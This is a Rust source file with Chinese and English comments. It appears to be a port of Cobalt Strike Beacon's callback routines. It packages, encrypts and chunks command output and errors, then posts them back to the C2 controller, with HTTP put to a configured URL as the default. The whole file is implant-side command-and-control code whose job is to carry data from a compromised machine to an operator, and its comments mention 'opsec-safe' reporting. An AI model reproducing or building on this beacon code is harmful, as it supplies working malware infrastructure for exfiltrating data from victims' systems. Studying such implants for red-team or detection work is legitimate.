//! 通过已配置的 C2 通道向 Cobalt Strike 回传数据的例程（callback.cpp）。出于历史原因，所有这些函数都以 `command_shell_` 开头。
//! Routines to send data back to Cobalt Strike through the configured C2
//! channel (callback.cpp). All these functions start with `command_shell_`
//! for historical reasons.

use crate::bformat::FormatP;
use crate::build::Builder;
use crate::security::{security_encrypt, HMAC_SIZE};

/// 命令回调的类型（`void (*cb)(char*, int, int)`）。
/// The type of a command callback (`void (*cb)(char*, int, int)`).
pub type Callback = fn(&[u8], i32, i32);

/// 处理响应的打包和加密。返回加密帧；调用方必须保持其存活。
/// Handle the packaging and encryption of a response.
/// Returns the encrypted frame; caller must keep it alive.
pub fn command_shell_encrypt(buffer: &[u8], length: usize, type_: i32) -> Option<Vec<u8>> {
    // 分配我们的内存：length + 32（包开销 + 填充）+ HMAC
    // allocate our memory: length + 32 (package overhead + padding) + HMAC
    let mut cipherdata = vec![0u8; length + 32 + HMAC_SIZE];

    // 构建我们的加密数据
    // build up our encrypted data
    let mut b = Builder::init(length + 32 + HMAC_SIZE);
    b.add_int(type_ as u32);
    b.add_data(&buffer[..length]);
    let length = b.length();

    // 出了严重问题，处理它
    // something went terribly wrong, deal with it
    if length <= 0 {
        return None;
    }

    let outlen = security_encrypt(&mut cipherdata, length);
    if outlen <= 0 {
        return None;
    }
    cipherdata.truncate(outlen as usize);
    Some(cipherdata)
}

/// 分块器：将元数据（长度、类型、块数据）作为 CALLBACK_CHUNK_ALLOCATE 发送，其余部分作为 CALLBACK_CHUNK_SEND 发送。
/// The chunker: send metadata (length, type, chunk data) as
/// CALLBACK_CHUNK_ALLOCATE, then the rest as CALLBACK_CHUNK_SEND.
pub fn command_shell_chunk(buffer: &[u8], length: usize, type_: i32) {
    let chunk = crate::settings::setting_int(crate::beacon::SETTING_C2_CHUNK_POST) as usize;
    let mut sent = 0usize;
    let mut meta = FormatP::init(chunk * 2);

    // 初始化我们的元数据包
    // initialize our metadata package
    meta.bformat_int((length + 4) as i32);
    meta.bformat_int(type_);
    let first = if chunk >= 8 { chunk - 8 } else { 0 };
    meta.bformat_copy(&buffer[..first]);

    // 用这个初始包发送我们的一部分数据！
    // send some of our data with this initial package!
    sent += first;
    let data = buffer[first..].to_vec();

    // 用我们的总大小构建一个块并发送它
    // build up a chunk with our total size and send it
    let meta_bytes = meta.bformat_string().to_vec();
    let mlen = meta.bformat_length();
    command_shell_post(&meta_bytes, mlen, crate::commands::CALLBACK_CHUNK_ALLOCATE, true);
    meta.free();

    // 好，发送我们的其他块，拜托了
    // OK, send our other chunks, plz
    while sent < length {
        // 计算我们这一轮要发送的量
        // calculate what we're going to send this go around
        let mut sz = length - sent;
        if sz > chunk {
            sz = chunk;
        }
        command_shell_post(&data[sent - first..sent - first + sz], sz, crate::commands::CALLBACK_CHUNK_SEND, true);
        sent += sz;
    }
}

/// 分块还是不分块？
/// To chunk or not to chunk?
pub fn command_shell_chunk_maybe(buffer: &[u8], blength: usize, type_: i32) {
    let chunk = crate::settings::setting_int(crate::beacon::SETTING_C2_CHUNK_POST) as usize;
    if blength > chunk {
        command_shell_chunk(buffer, blength, type_);
    } else {
        command_shell_post(buffer, blength, type_, true);
    }
}

/// 以 opsec 安全的方式回传错误。
/// Post an error in an opsec-safe way.
pub fn post_error_generic(error: i32, arg1: i32, arg2: i32, arg3: Option<&[u8]>) {
    let mut result = FormatP::init(2048);
    result.bformat_int(error);
    result.bformat_int(arg1);
    result.bformat_int(arg2);
    if let Some(arg3) = arg3 {
        result.bformat_copy(arg3);
    }
    let data = result.bformat_string().to_vec();
    let len = result.bformat_length();
    command_shell_callback(&data, len as i32, crate::commands::CALLBACK_ERROR);
    result.free();
}

pub fn post_error_d(error: i32, arg: i32) {
    post_error_generic(error, arg, 0, None);
}

pub fn post_error_s(error: i32, text: &[u8]) {
    post_error_generic(error, 0, 0, Some(text));
}

pub fn post_error_sd(error: i32, text: &[u8], arg: i32) {
    post_error_generic(error, arg, 0, Some(text));
}

pub fn post_error_dd(error: i32, arg1: i32, arg2: i32) {
    post_error_generic(error, arg1, arg2, None);
}

pub fn post_error_na(error: i32) {
    post_error_generic(error, 0, 0, None);
}

pub fn post_error(error: i32, fmt: std::fmt::Arguments<'_>) {
    let mut buff = String::new();
    use std::fmt::Write as _;
    let _ = buff.write_fmt(fmt);
    post_error_generic(error, 0, 0, Some(buff.as_bytes()));
}

/// 向 CS 回传加密重放错误。
/// Post a crypto replay error back to CS.
pub fn post_crypt_replay_error(diff: u32) {
    let temp = diff.to_be_bytes();
    command_shell_callback(&temp, 4, crate::commands::CALLBACK_POST_REPLAY_ERROR);
}

/// 真正的回调入口（command_shell_callback）由各入口 crate（beacon/dnsb/pivot/extc2）提供，镜像 C++ 布局，每个项目各自定义 `command_shell_post` 与 `command_shell_callback`。本模块暴露共享辅助；入口在此注册它们的 post 实现。
/// The actual callback entry point (command_shell_callback) is provided by
/// each entry crate (beacon/dnsb/pivot/extc2), mirroring the C++ layout
/// where each project defines its own `command_shell_post` and
/// `command_shell_callback`. This module exposes the shared helpers; the
/// entries register their post implementation here.
static POST_FN: std::sync::OnceLock<fn(&[u8], usize, i32, bool)> = std::sync::OnceLock::new();

/// 注册项目特定的 `command_shell_post` 实现。
/// Register the project-specific `command_shell_post` implementation.
pub fn register_command_shell_post(f: fn(&[u8], usize, i32, bool)) {
    let _ = POST_FN.set(f);
}

/// 发送加密+打包的响应（项目特定的回传）。
/// Send an encrypted+packaged response (project-specific posting).
pub fn command_shell_post(buffer: &[u8], length: usize, type_: i32, send_now: bool) {
    match POST_FN.get() {
        Some(f) => f(buffer, length, type_, send_now),
        None => {
            // 默认：HTTP 回传
            // default: HTTP post
            crate::channel::http_put(
                &crate::state::POST_URL.lock().clone(),
                buffer,
                length,
                send_now,
            );
        }
    }
}

/// 回传数据到控制器的逻辑入口。
/// Entry point into the logic to post data back to the controller.
pub fn command_shell_callback(buffer: &[u8], length: i32, type_: i32) {
    let should_chunk = crate::settings::setting_int(crate::beacon::SETTING_C2_CHUNK_POST) > 0;
    if crate::state::post_type() == crate::commands::POST_HTTP && should_chunk {
        command_shell_chunk_maybe(buffer, length as usize, type_);
    } else {
        command_shell_post(buffer, length as usize, type_, false);
    }
}
